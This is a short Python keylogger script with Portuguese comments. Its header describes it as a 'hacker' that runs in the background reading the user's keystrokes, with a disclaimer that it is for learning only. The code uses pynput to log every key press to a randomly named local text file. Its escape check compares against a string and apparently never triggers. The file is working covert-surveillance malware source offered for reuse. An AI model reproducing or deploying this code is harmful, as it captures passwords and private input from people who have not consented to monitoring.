
""" -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- K E Y L O G G E R -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 Objetivo deste aplicativo é apenas por aprendizado, não me responsabilizo por uso de maneiras ilícitas

 Esse programa seria um hacker que roda em segundo plano que lê (ouvi) as teclas inseridas pelo Usuario

 esse scipt irá ter atualizações...
    -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
"""
__version__ = "1.0"
__author__ = "EvandroAbreu"
__license__ = "Unlicense"

# importando bibiotecas necessarias
from pynput.keyboard import Listener
import sys
import random

#gerando nome do arquivo de log
number = random.randint(0,10000)
log = f'yek{number}.txt'

# função que escreve as teclas no arquivo de log
def escreve_key(key):
    # abrindo o arquivo no modo append
    with open(f'{log}','a') as file:
        file.write(f'{str(key)}\n')
    # se a tecla for esc, encerra o programa
    if key == 'key.esc': 
        sys.exit()
# iniciando o listener        
with Listener(on_press=escreve_key) as logs:
    logs.join()